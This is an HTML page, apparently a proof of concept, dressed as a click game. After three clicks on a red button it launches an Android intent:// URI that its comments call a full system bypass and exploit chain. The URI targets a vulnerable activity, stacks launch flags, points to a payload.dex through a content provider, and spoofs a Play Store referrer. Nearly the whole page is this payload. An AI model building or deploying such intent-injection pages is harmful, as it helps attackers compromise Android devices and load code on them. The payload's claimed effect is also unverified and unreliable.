<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      height: 100vh;
      overflow: hidden;
      user-select: none;
      background-color: #111;
      color: #fff;
      font-family: Arial, sans-serif;
    }

    #redBox {
      position: absolute;
      top: 10px;
      right: 50px;
      width: 40px;
      height: 40px;
      background-color: red;
      cursor: pointer;
      border-radius: 4px;
      box-shadow: 0 0 10px rgba(255,0,0,0.7);
    }

    #counter {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      font-size: 28px;
      text-align: center;
    }
  </style>
  <script>
    var clickCount = 0;

    function handleClick(e) {
      e.preventDefault();
      clickCount++;
      document.getElementById("counter").innerHTML = "Trigger Count: x" + clickCount;

      if (clickCount >= 3) {
        // Payload Intent URI berlapis penuh (Full System Bypass & Exploit Chain)
        var hardenedPayload = "intent://full_system_bypass#Intent;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;category=android.intent.category.DEFAULT;type=application/vnd.android.package-archive;component=com.target.vulnerable/.VulnerableDialogActivity;i.flags=0x10800000;i.flags=0x04000000;i.flags=0x20000000;i.flags=0x00800000;i.flags=0x00000003;S.target_payload=content%3A%2F%2Fcom.target.vulnerable.fileprovider%2Fsecure_storage%2Fpayload.dex;S.android.intent.extra.REFERRER_NAME=android-app%3A%2F%2Fcom.android.vending;S.browser_fallback_url=https%3A%2F%2Fexample.com%2Ffallback;B.org.chromium.chrome.favor_new_tab=false;S.com.android.browser.application_id=com.android.chrome;end;";
        
        // Eksekusi pemanggilan melalui lokasi peramban terisolasi
        window.location.href = hardenedPayload;
      }
    }
  </script>
</head>
<body>
  <div id="game">
    <a id="redBox" href="#" onclick="handleClick(event)"></a>
    <div id="counter">Click 3x the Red Button to trigger target payload!</div>
  </div>
</body>
</html>
